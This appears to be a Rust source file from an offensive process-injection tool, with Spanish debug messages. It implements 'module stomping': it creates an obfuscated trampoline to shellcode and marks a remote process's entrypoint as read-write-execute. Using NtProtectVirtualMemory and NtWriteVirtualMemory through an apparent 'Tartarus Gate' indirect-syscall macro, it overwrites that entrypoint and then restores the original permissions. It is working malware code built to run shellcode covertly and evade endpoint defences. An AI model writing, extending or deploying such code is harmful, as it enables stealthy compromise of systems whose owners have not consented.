use std::ffi::c_void;

use windows::Win32::Foundation::HANDLE;

use crate::injection::trampoline::create_obfuscated_trampoline;
use crate::{debug, tartarusgate};

pub fn run_module_stomp(process_handle: HANDLE, entrypoint: *mut c_void, shellcode_addr: usize) -> Result<(), Box<dyn std::error::Error>> {
    unsafe {
        let target = shellcode_addr as usize;
        let trampoline = create_obfuscated_trampoline(target);
        debug!("Trampolin creado correctamente..");

        let mut base = entrypoint as *mut c_void;
        let mut size = trampoline.len();
        let mut old_protect = 0;

        let status = tartarusgate!("NtProtectVirtualMemory", process_handle.0 as usize, &mut base as *mut _ as usize, &mut size as *mut _ as usize, 0x40, &mut old_protect as *mut _ as usize);
        debug!("Estado de NtProtectVirtualMemory: {:X}", status);

        if status == 0 {
            debug!("Se ha cambiado los permisos a RWX en el entrypoint remoto");

            let mut written_bytes: usize = 0;
            let status = tartarusgate!("NtWriteVirtualMemory", process_handle.0 as usize, entrypoint as usize, trampoline.as_ptr() as usize, trampoline.len(), &mut written_bytes as *mut _ as usize);

            if written_bytes == 0 || status != 0 {
                return Err("No se escribio el trampolin en la memoria".into());
            }
            debug!("Se ha escrito el trampolin correctamete");
            debug!("Se ha escrito {:?} bytes de {:?} bytes", written_bytes, trampoline.len());

            let status = tartarusgate!("NtProtectVirtualMemory", process_handle.0 as usize, &mut base as *mut _ as usize, &mut size as *mut _ as usize, old_protect as usize, &mut old_protect as *mut _ as usize);
            if status == 0 {
                debug!("Los permisos se han restaurado correctamente...");
            }
        } else {
            debug!("Fallo con el cambio de permisos con NtProtectVirtualMemory");
        }

        Ok(())
    }
}
